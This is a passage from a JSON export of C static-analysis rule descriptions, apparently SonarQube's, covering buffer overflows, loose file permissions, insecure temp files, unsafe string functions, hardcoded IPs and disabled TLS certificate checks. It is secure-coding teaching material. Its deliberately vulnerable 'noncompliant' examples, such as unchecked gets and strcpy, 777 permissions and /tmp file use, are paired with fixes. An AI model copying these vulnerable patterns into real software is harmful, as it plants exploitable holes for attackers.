        "htmlDesc": "<p>Insecure functions often involve handling data, such as strings and memory operations. The vulnerability arises when these functions do not\nproperly check or limit the size of the data they are handling.</p>\n<h2>Why is this an issue?</h2>\n<p>An attacker typically provides input that exceeds the expected size. This could be through a text field in a user interface, a file that the\nprogram reads, or data sent over a network. The insecure function processes this input and places the result into a provided buffer.</p>\n<p>If the input is larger than the buffer can handle, the insecure function will overwrite the memory following the buffer. This situation is known as\na buffer overflow vulnerability.</p>\n<p>When using typical C or C++ functions, it’s up to the developer to make sure the size of the buffer to be written to is large enough to avoid\nbuffer overflows.</p>\n<h3>What is the potential impact?</h3>\n<h4>Code execution</h4>\n<p>In some cases, an attacker can craft input in a way that allows them to gain unauthorized access to your system. For example, they might be able to\noverwrite a function’s return address in memory, causing your program to execute code of the attacker’s choosing. This could potentially give the\nattacker full control over your system.</p>\n<h4>Denial of service</h4>\n<p>If an attacker can trigger a buffer overflow by providing oversized input, it can cause the program to crash. If the attacker repeats this process,\nit can continually disrupt the service, denying access to other users. This can be particularly damaging for services that require high availability,\nsuch as online platforms or databases.</p>\n<p>In some cases, the input might cause the program to enter an infinite loop or consume excessive memory, slowing down the system or even causing it\nto become unresponsive. This type of attack is known as a resource exhaustion DoS attack.</p>\n<h2>How to fix it</h2>\n<p>Insecure functions should be replaced with safer alternatives that limit how much data can be written to the buffer.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n#include &lt;stdio.h&gt;\n\nchar str[20];\ngets(str); // Noncompliant; `str` buffer size is not checked and it is vulnerable to overflows\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\n#include &lt;string.h&gt;\n\nchar buffer[20];\nstrcpy(buffer, input); // Noncompliant; `input` length is not checked and it may overflow `buffer`\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n#define __STDC_WANT_LIB_EXT1__\n#include &lt;stdio.h&gt;\n\nchar str[20];\ngets_s(str, sizeof(str));\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\n#define __STDC_WANT_LIB_EXT1__\n#include &lt;string.h&gt;\n\nchar buffer[20];\nstrcpy_s(buffer, sizeof buffer, input);\n</pre>\n<h3>How does this work?</h3>\n<p>C and C++ have a number of functions that are considered insecure because they do not perform bounds checking. Functions like <code>gets</code> are\nknown to be risky. Replace these with safer alternatives that include bounds checking. For example, instead of <code>gets</code>, use\n<code>gets_s</code>.</p>\n<p>The code can also checks if the size of input data is less than or equal to the size of a buffer (including the terminating null byte when dealing\nwith strings).</p>\n<p>The <code>gets_s</code> function is defined in annex K of C11 and is optional for C11 compilers. It will only be available if the macro\n<code>__STDC_LIB_EXT1__</code> is defined, and it must be enabled by defining the macro <code>__STDC_WANT_LIB_EXT1__</code> before including\n<code>&lt;stdio.h&gt;</code>.</p>\n<p>Other platform-specific functions can perform the same operations. For example, <code>strcpy</code> can be substituted with <a\nhref=\"https://learn.microsoft.com/en-us/windows/win32/api/strsafe/nf-strsafe-stringcbcopya\">StringCbCopyA</a> (Windows) or <a\nhref=\"https://www.freebsd.org/cgi/man.cgi?query=strlcpy\">strlcpy</a> (FreeBSD).</p>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> Wikipedia - <a href=\"https://en.wikipedia.org/wiki/Buffer_overflow\">Buffer overflow</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/\">Top 10 2021 - A06 - Vulnerable and Outdated\n  Components</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities\">Top 10 2017 Category A9 -\n  Using Components with Known Vulnerabilities</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/676\">CWE-676 - Use of Potentially Dangerous Function</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/119\">CWE-119 - Improper Restriction of Operations within the Bounds of a Memory\n  Buffer</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "c:S2612": {
        "name": "Setting loose POSIX file permissions is security-sensitive",
        "htmlDesc": "<p>In Unix file system permissions, the \"<code>others</code>\" category refers to all users except the owner of the file system resource and the\nmembers of the group assigned to this resource.</p>\n<p>Granting permissions to this category can lead to unintended access to files or directories that could allow attackers to obtain sensitive\ninformation, disrupt services or elevate privileges.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The application is designed to be run on a multi-user environment. </li>\n  <li> Corresponding files and directories may contain confidential information. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>The most restrictive possible permissions should be assigned to files and directories.</p>\n<h2>Sensitive Code Example</h2>\n<p>When creating a file or directory with permissions to \"other group\":</p>\n<pre>\nopen(\"myfile.txt\", O_CREAT, S_IRWXU | S_IRWXG | S_IRWXO); // Sensitive: the process set 777 permissions to this newly created file\n\nmkdir(\"myfolder\", S_IRWXU | S_IRWXG | S_IRWXO); // Sensitive: the process try to set 777 permissions to this newly created directory\n</pre>\n<p>When explicitly adding permissions to \"other group\" with <code>chmod</code>, <code>fchmod</code> or <code>filesystem::permissions</code>\nfunctions:</p>\n<pre>\nchmod(\"myfile.txt\", S_IRWXU | S_IRWXG | S_IRWXO);  // Sensitive: the process set 777 permissions to this file\n\nfchmod(fd, S_IRWXU | S_IRWXG | S_IRWXO); // Sensitive: the process set 777 permissions to this file descriptor\n</pre>\n<p>When defining the <code>umask</code> without read, write and execute permissions for \"other group\":</p>\n<pre>\numask(S_IRWXU | S_IRWXG); // Sensitive: the further files and folders will be created with possible permissions to \"other group\"\n</pre>\n<h2>Compliant Solution</h2>\n<p>When creating a file or directory, do not set permissions to \"other group\":</p>\n<pre>\nopen(\"myfile.txt\", O_CREAT, S_IRWXU | S_IRWXG); // Compliant\n\nmkdir(\"myfolder\", S_IRWXU | S_IRWXG); // Compliant\n</pre>\n<p>When using <code>chmod</code>, <code>fchmod</code> or <code>filesystem::permissions</code> functions, do not add permissions to \"other group\":</p>\n<pre>\nchmod(\"myfile.txt\", S_IRWXU | S_IRWXG);  // Compliant\n\nfchmod(fd, S_IRWXU | S_IRWXG); // Compliant\n</pre>\n<p>When defining the <code>umask</code>, set read, write and execute permissions to other group:</p>\n<pre>\numask(S_IRWXO); // Compliant: further created files or directories will not have permissions set for \"other group\"\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A04_2021-Insecure_Design/\">Top 10 2021 Category A4 - Insecure Design</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> <a\n  href=\"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission\">OWASP File Permission</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/732\">CWE-732 - Incorrect Permission Assignment for Critical Resource</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/266\">CWE-266 - Incorrect Privilege Assignment</a> </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/display/c/FIO06-C.+Create+files+with+appropriate+access+permissions\">CERT, FIO06-C.</a> - Create\n  files with appropriate access permissions </li>\n</ul>",
        "severity": "MAJOR"
      },
      "c:S5443": {
        "name": "Using publicly writable directories is security-sensitive",
        "htmlDesc": "<p>Operating systems have global directories where any user has write access. Those folders are mostly used as temporary storage areas like\n<code>/tmp</code> in Linux based systems. An application manipulating files from these folders is exposed to race conditions on filenames: a malicious\nuser can try to create a file with a predictable name before the application does. A successful attack can result in other files being accessed,\nmodified, corrupted or deleted. This risk is even higher if the application runs with elevated permissions.</p>\n<p>In the past, it has led to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2012-2451\">CVE-2012-2451</a> </li>\n  <li> <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2015-1838\">CVE-2015-1838</a> </li>\n</ul>\n<p>This rule raises an issue whenever it detects a hard-coded path to a publicly writable directory like <code>/tmp</code> (see examples bellow). It\nalso detects access to environment variables that point to publicly writable directories, e.g., <code>TMP</code> and <code>TMPDIR</code>.</p>\n<ul>\n  <li> <code>/tmp</code> </li>\n  <li> <code>/var/tmp</code> </li>\n  <li> <code>/usr/tmp</code> </li>\n  <li> <code>/dev/shm</code> </li>\n  <li> <code>/dev/mqueue</code> </li>\n  <li> <code>/run/lock</code> </li>\n  <li> <code>/var/run/lock</code> </li>\n  <li> <code>/Library/Caches</code> </li>\n  <li> <code>/Users/Shared</code> </li>\n  <li> <code>/private/tmp</code> </li>\n  <li> <code>/private/var/tmp</code> </li>\n  <li> <code>\\Windows\\Temp</code> </li>\n  <li> <code>\\Temp</code> </li>\n  <li> <code>\\TMP</code> </li>\n</ul>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Files are read from or written into a publicly writable folder </li>\n  <li> The application creates files with predictable names into a publicly writable folder </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Use a dedicated sub-folder with tightly controlled permissions </li>\n  <li> Use secure-by-design APIs to create temporary files. Such API will make sure:\n    <ul>\n      <li> The generated filename is unpredictable </li>\n      <li> The file is readable and writable only by the creating user ID </li>\n      <li> The file descriptor is not inherited by child processes </li>\n      <li> The file will be destroyed as soon as it is closed </li>\n    </ul>  </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\n#include &lt;cstdio&gt;\n// ...\n\nvoid f() {\n  FILE * fp = fopen(\"/tmp/temporary_file\", \"r\"); // Sensitive\n}\n</pre>\n<pre>\n#include &lt;cstdio&gt;\n#include &lt;cstdlib&gt;\n#include &lt;sstream&gt;\n// ...\n\nvoid f() {\n  std::stringstream ss;\n  ss &lt;&lt; getenv(\"TMPDIR\") &lt;&lt; \"/temporary_file\"; // Sensitive\n  FILE * fp = fopen(ss.str().c_str(), \"w\");\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n#include &lt;cstdio&gt;\n#include &lt;cstdlib&gt;\n// ...\n\nvoid f() {\n  FILE * fp = tmpfile(); // Compliant\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/377\">CWE-377 - Insecure Temporary File</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/379\">CWE-379 - Creation of Temporary File in Directory with Incorrect Permissions</a>\n  </li>\n  <li> <a href=\"https://owasp.org/www-community/vulnerabilities/Insecure_Temporary_File\">OWASP, Insecure Temporary File</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "c:S5813": {
        "name": "Using \"strlen\" or \"wcslen\" is security-sensitive",
        "htmlDesc": "<p>The function <code>size_t strlen(const char *s)</code> measures the length of the string <code>s</code> (excluding the final null character).<br>\nThe function <code>size_t wcslen(const wchar_t *s)</code> does the same for wide characters, and should be used with the same guidelines.</p>\n<p>Similarly to many other functions in the standard C libraries, <code>strlen</code> and <code>wcslen</code> assume that their argument is not a null\npointer.</p>\n<p>Additionally, they expect the strings to be null-terminated. For example, the 5-letter string \"abcde\" must be stored in memory as \"abcde\\0\" (i.e.\nusing 6 characters) to be processed correctly. When a string is missing the null character at the end, these functions will iterate past the end of\nthe buffer, which is undefined behavior.</p>\n<p>Therefore, string parameters must end with a proper null character. The absence of this particular character can lead to security vulnerabilities\nthat allow, for example, access to sensitive data or the execution of arbitrary code.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> There is a possibility that the pointer is null. </li>\n  <li> There is a possibility that the string is not correctly null-terminated. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Use safer functions. The C11 functions <code>strlen_s</code> and <code>wcslen_s</code> from annex K handle typical programming errors.<br>\n  Note, however, that they have a runtime overhead and require more code for error handling and therefore are not suited to every case. </li>\n  <li> Even if your compiler does not exactly support annex K, you probably have access to similar functions. </li>\n  <li> If you are writing C++ code, using <code>std::string</code> to manipulate strings is much simpler and less error-prone. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nsize_t f(char *src) {\n  char dest[256];\n  strncpy(dest, src, sizeof dest); // Truncation may happen\n  return strlen(dest); // Sensitive: \"dest\" will not be null-terminated if truncation happened\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nsize_t f(char *src) {\n  char dest[256];\n  strncpy(dest, src, sizeof dest); // Truncation may happen\n  dest[sizeof dest - 1] = 0;\n  return strlen(dest); // Compliant: \"dest\" is guaranteed to be null-terminated\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/120\">CWE-120 - Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')</a>\n  </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/HdcxBQ\">CERT, STR07-C.</a> - Use the bounds-checking interfaces for string manipulation </li>\n</ul>",
        "severity": "MAJOR"
      },
      "c:S5814": {
        "name": "Using \"strcat\" or \"wcscat\" is security-sensitive",
        "htmlDesc": "<p>In C, a string is just a buffer of characters, normally using the <code>null</code> character as a sentinel for the end of the string. This means\nthat the developer has to be aware of low-level details such as buffer sizes or having an extra character to store the final <code>null</code>\ncharacter. Doing that correctly and consistently is notoriously difficult and any error can lead to a security vulnerability, for instance, giving\naccess to sensitive data or allowing arbitrary code execution.</p>\n<p>The function <code>char *strcat( char *restrict dest, const char *restrict src );</code> appends the characters of string <code>src</code> at the\nend of <code>dest</code>. The <code>wcscat</code> does the same for wide characters and should be used with the same guidelines.</p>\n<p>Note: the functions <code>strncat</code> and <code>wcsncat</code> might look like attractive safe replacements for <code>strcat</code> and\n<code>wcscaty</code>, but they have their own set of issues (see <a href='/coding_rules#rule_key=c%3AS5815'>S5815</a>), and you should probably prefer another more adapted\nalternative.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> There is a possibility that either the <code>src</code> or the <code>dest</code> pointer is <code>null</code> </li>\n  <li> The current string length of <code>dest</code> plus the current string length of <code>src</code> plus 1 (for the final&nbsp;<code>null</code>\n  character) is larger than the size of the buffer pointer-to by <code>src</code> </li>\n  <li> There is a possibility that either string is not correctly <code>null</code>-terminated </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> C11 provides, in its annex K, the <code>strcat_s</code> and the <code>wcscat_s</code> that were designed as safer alternatives to\n  <code>strcat</code> and <code>wcscat</code>. It’s not recommended to use them in all circumstances, because they introduce a runtime overhead and\n  require to write more code for error handling, but they perform checks that will limit the consequences of calling the function with bad arguments.\n  </li>\n  <li> Even if your compiler does not exactly support annex K, you probably have access to similar functions </li>\n  <li> If you are writing C++ code, using <code>std::string</code> to manipulate strings is much simpler and less error-prone </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nint f(char *src) {\n  char dest[256];\n  strcpy(dest, \"Result: \");\n  strcat(dest, src); // Sensitive: might overflow\n  return doSomethingWith(dest);\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nint f(char *src) {\n  char result[] = \"Result: \";\n  char *dest = malloc(sizeof(result) + strlen(src)); // Not need of +1 for final 0 because sizeof will already count one 0\n  strcpy(dest, result);\n  strcat(dest, src); // Compliant: the buffer size was carefully crafted\n  int r = doSomethingWith(dest);\n  free(dest);\n  return r;\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/\">Top 10 2021 Category A6 - Vulnerable and Outdated\n  Components</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities\">Top 10 2017 Category A9 -\n  Using Components with Known Vulnerabilities</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/120\">CWE-120 - Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')</a>\n  </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/HdcxBQ\">CERT, STR07-C.</a> - Use the bounds-checking interfaces for string manipulation </li>\n</ul>",
        "severity": "MAJOR"
      },
      "c:S5815": {
        "name": "Using \"strncat\" or \"wcsncat\" is security-sensitive",
        "htmlDesc": "<p>In C, a string is just a buffer of characters, normally using the <code>null</code> character as a sentinel for the end of the string. This means\nthat the developer has to be aware of low-level details such as buffer sizes or having an extra character to store the final <code>null</code>\ncharacter. Doing that correctly and consistently is notoriously difficult and any error can lead to a security vulnerability, for instance, giving\naccess to sensitive data or allowing arbitrary code execution.</p>\n<p>The function <code>char *strncat( char *restrict dest, const char *restrict src, size_t count );</code> appends the characters of string\n<code>src</code> at the end of <code>dest</code>, but only add <code>count</code> characters max. <code>dest</code> will always be\n<code>null</code>-terminated. The <code>wcsncat</code> does the same for wide characters, and should be used with the same guidelines.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> There is a possibility that either the <code>src</code> or the <code>dest</code> pointer is <code>null</code> </li>\n  <li> The current string length of <code>dest</code> plus the current string length of <code>src</code> plus 1 (for the final <code>null</code>\n  character) is larger than the size of the buffer pointer-to by <code>src</code> </li>\n  <li> There is a possibility that either string is not correctly <code>null</code>-terminated </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> C11 provides, in its annex K, the <code>strncat_s</code> and the <code>wcsncat_s</code> that were designed as safer alternatives to\n  <code>strncat</code> and <code>wcsncat</code>. It’s not recommended to use them in all circumstances because they introduce a runtime overhead and\n  require to write more code for error handling, but they perform checks that will limit the consequences of calling the function with bad arguments.\n  </li>\n  <li> Even if your compiler does not exactly support annex K, you probably have access to similar functions </li>\n  <li> If you are using <code>strncat</code> and <code>wsncat</code> as a safer version of <code>strcat</code> and <code>wcscat</code>, you should\n  instead consider <code>strcat_s</code> and <code>wcscat_s</code> because these functions have several shortcomings:\n    <ul>\n      <li> It’s not easy to detect truncation </li>\n      <li> The <code>count</code> parameter is error-prone </li>\n      <li> Computing the <code>count</code> parameter typically requires computing the string length of <code>dest</code>, at which point other\n      simpler alternatives exist </li>\n    </ul>  </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nint f(char *src) {\n  char dest[256];\n  strcpy(dest, \"Result: \");\n  strncat(dest, src, sizeof dest); // Sensitive: passing the buffer size instead of the remaining size\n  return doSomethingWith(dest);\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nint f(char *src) {\n  char result[] = \"Result: \";\n  char dest[256];\n  strcpy(dest, result);\n  strncat(dest, src, sizeof dest - sizeof result); // Compliant but may silently truncate\n  return doSomethingWith(dest);\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/\">Top 10 2021 Category A6 - Vulnerable and Outdated\n  Components</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities\">Top 10 2017 Category A9 -\n  Using Components with Known Vulnerabilities</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/120\">CWE-120 - Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')</a>\n  </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/HdcxBQ\">CERT, STR07-C.</a> - Use the bounds-checking interfaces for string manipulation </li>\n</ul>",
        "severity": "MAJOR"
      },
      "c:S5816": {
        "name": "Using \"strncpy\" or \"wcsncpy\" is security-sensitive",
        "htmlDesc": "<p>In C, a string is just a buffer of characters, normally using the <code>null</code> character as a sentinel for the end of the string. This means\nthat the developer has to be aware of low-level details such as buffer sizes or having an extra character to store the final <code>null</code>\ncharacter. Doing that correctly and consistently is notoriously difficult and any error can lead to a security vulnerability, for instance, giving\naccess to sensitive data or allowing arbitrary code execution.</p>\n<p>The function <code>char *strncpy(char * restrict dest, const char * restrict src, size_t count);</code> copies the first <code>count</code>\ncharacters from <code>src</code> to <code>dest</code>, stopping at the first <code>null</code> character, and filling extra space with 0. The\n<code>wcsncpy</code> does the same for wide characters and should be used with the same guidelines.</p>\n<p>Both of those functions are designed to work with fixed-length strings and might result in a non-<code>null</code>-terminated string.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> There is a possibility that either the <code>source</code> or the <code>destination</code> pointer is <code>null</code> </li>\n  <li> The security of your system can be compromised if the <code>destination</code> is a truncated version of the <code>source</code> </li>\n  <li> The <code>source</code> buffer can be both non-<code>null</code>-terminated and smaller than the <code>count</code> </li>\n  <li> The <code>destination</code> buffer can be smaller than the <code>count</code> </li>\n  <li> You expect <code>dest</code> to be a <code>null</code>-terminated string </li>\n  <li> There is an overlap between the <code>source</code> and the <code>destination</code> </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> C11 provides, in its annex K, the <code>strncpy_s</code> and the <code>wcsncpy_s</code> that were designed as safer alternatives to\n  <code>strcpy</code> and <code>wcscpy</code>. It’s not recommended to use them in all circumstances, because they introduce a runtime overhead and\n  require to write more code for error handling, but they perform checks that will limit the consequences of calling the function with bad arguments.\n  </li>\n  <li> Even if your compiler does not exactly support annex K, you probably have access to similar functions </li>\n  <li> If you are using <code>strncpy</code> and <code>wsncpy</code> as a safer version of <code>strcpy</code> and <code>wcscpy</code>, you should\n  instead consider <code>strcpy_s</code> and <code>wcscpy_s</code>, because these functions have several shortcomings:\n    <ul>\n      <li> It’s not easy to detect truncation </li>\n      <li> Too much work is done to fill the buffer with 0, leading to suboptimal performance </li>\n      <li> Unless manually corrected, the <code>dest</code> string might not be <code>null</code>-terminated </li>\n    </ul>  </li>\n  <li> If you want to use <code>strcpy</code> and <code>wcscpy</code> functions and detect if the string was truncated, the pattern is the following:\n    <ul>\n      <li> Set the last character of the buffer to <code>null</code> </li>\n      <li> Call the function </li>\n      <li> Check if the last character of the buffer is still <code>null</code> </li>\n    </ul>  </li>\n  <li> If you are writing C++ code, using <code>std::string</code> to manipulate strings is much simpler and less error-prone </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nint f(char *src) {\n  char dest[256];\n  strncpy(dest, src, sizeof(dest)); // Sensitive: might silently truncate\n  return doSomethingWith(dest);\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nint f(char *src) {\n  char dest[256];\n  dest[sizeof dest - 1] = 0;\n  strncpy(dest, src, sizeof(dest)); // Compliant\n  if (dest[sizeof dest - 1] != 0) {\n    // Handle error\n  }\n  return doSomethingWith(dest);\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/\">Top 10 2021 Category A6 - Vulnerable and Outdated\n  Components</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities\">Top 10 2017 Category A9 -\n  Using Components with Known Vulnerabilities</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/120\">CWE-120 - Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')</a>\n  </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/HdcxBQ\">CERT, STR07-C.</a> - Use the bounds-checking interfaces for string manipulation </li>\n</ul>",
        "severity": "MAJOR"
      },
      "c:S1313": {
        "name": "Using hardcoded IP addresses is security-sensitive",
        "htmlDesc": "<p>Hardcoding IP addresses is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-5901\">CVE-2006-5901</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3725\">CVE-2005-3725</a> </li>\n</ul>\n<p>Today’s services have an ever-changing architecture due to their scaling and redundancy needs. It is a mistake to think that a service will always\nhave the same IP address. When it does change, the hardcoded IP will have to be modified too. This will have an impact on the product development,\ndelivery, and deployment:</p>\n<ul>\n  <li> The developers will have to do a rapid fix every time this happens, instead of having an operation team change a configuration file. </li>\n  <li> It misleads to use the same address in every environment (dev, sys, qa, prod). </li>\n</ul>\n<p>Last but not least it has an effect on application security. Attackers might be able to decompile the code and thereby discover a potentially\nsensitive address. They can perform a Denial of Service attack on the service, try to get access to the system, or try to spoof the IP address to\nbypass security checks. Such attacks can always be possible, but in the case of a hardcoded IP address solving the issue will take more time, which\nwill increase an attack’s impact.</p>\n<h2>Ask Yourself Whether</h2>\n<p>The disclosed IP address is sensitive, e.g.:</p>\n<ul>\n  <li> Can give information to an attacker about the network topology. </li>\n  <li> It’s a personal (assigned to an identifiable person) IP address. </li>\n</ul>\n<p>There is a risk if you answered yes to any of these questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Don’t hard-code the IP address in the source code, instead make it configurable with environment variables, configuration files, or a similar\napproach. Alternatively, if confidentially is not required a domain name can be used since it allows to change the destination quickly without having\nto rebuild the software.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\ndbi_conn conn = dbi_conn_new(\"mysql\");\nstring host = \"10.10.0.1\"; // Sensitive\ndbi_conn_set_option(conn, \"host\", host.c_str());\ndbi_conn_set_option(conn, \"host\", \"10.10.0.1\"); // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\ndbi_conn conn = dbi_conn_new(\"mysql\");\nstring host = getDatabaseHost(); // Compliant\ndbi_conn_set_option(conn, \"host\", host.c_str()); // Compliant\n</pre>\n<h2>Exceptions</h2>\n<p>No issue is reported for the following cases because they are not considered sensitive:</p>\n<ul>\n  <li> Loopback addresses 127.0.0.0/8 in CIDR notation (from 127.0.0.0 to 127.255.255.255) </li>\n  <li> Broadcast address 255.255.255.255 </li>\n  <li> Non-routable address 0.0.0.0 </li>\n  <li> Strings of the form <code>2.5.&lt;number&gt;.&lt;number&gt;</code> as they <a href=\"http://www.oid-info.com/introduction.htm\">often match\n  Object Identifiers</a> (OID) </li>\n  <li> Addresses in the ranges 192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24, reserved for documentation purposes by <a\n  href=\"https://datatracker.ietf.org/doc/html/rfc5737\">RFC 5737</a> </li>\n  <li> Addresses in the range 2001:db8::/32, reserved for documentation purposes by <a href=\"https://datatracker.ietf.org/doc/html/rfc3849\">RFC\n  3849</a> </li>\n</ul>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "c:S4830": {
        "name": "Server certificates should be verified during SSL/TLS connections",
        "htmlDesc": "<p>This vulnerability makes it possible that an encrypted communication is intercepted.</p>\n<h2>Why is this an issue?</h2>\n<p>Transport Layer Security (TLS) provides secure communication between systems over the internet by encrypting the data sent between them.\nCertificate validation adds an extra layer of trust and security to this process to ensure that a system is indeed the one it claims to be.</p>\n<p>When certificate validation is disabled, the client skips a critical security check. This creates an opportunity for attackers to pose as a trusted\nentity and intercept, manipulate, or steal the data being transmitted.</p>\n<h3>What is the potential impact?</h3>\n<p>Establishing trust in a secure way is a non-trivial task. When you disable certificate validation, you are removing a key mechanism designed to\nbuild this trust in internet communication, opening your system up to a number of potential threats.</p>\n<h4>Identity spoofing</h4>\n<p>If a system does not validate certificates, it cannot confirm the identity of the other party involved in the communication. An attacker can\nexploit this by creating a fake server and masquerading as a legitimate one. For example, they might set up a server that looks like your bank’s\nserver, tricking your system into thinking it is communicating with the bank. This scenario, called identity spoofing, allows the attacker to collect\nany data your system sends to them, potentially leading to significant data breaches.</p>\n<h4>Loss of data integrity</h4>\n<p>When TLS certificate validation is disabled, the integrity of the data you send and receive cannot be guaranteed. An attacker could modify the data\nin transit, and you would have no way of knowing. This could range from subtle manipulations of the data you receive to the injection of malicious\ncode or malware into your system. The consequences of such breaches of data integrity can be severe, depending on the nature of the data and the\nsystem.</p>\n<h2>How to fix it in Botan</h2>\n<h3>Code examples</h3>\n<p>The following code contains examples of disabled certificate validation.</p>\n<p>The certificate validation gets disabled by overriding <code>tls_verify_cert_chain</code> with an empty implementation. It is highly recommended to\nuse the original implementation.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n#include 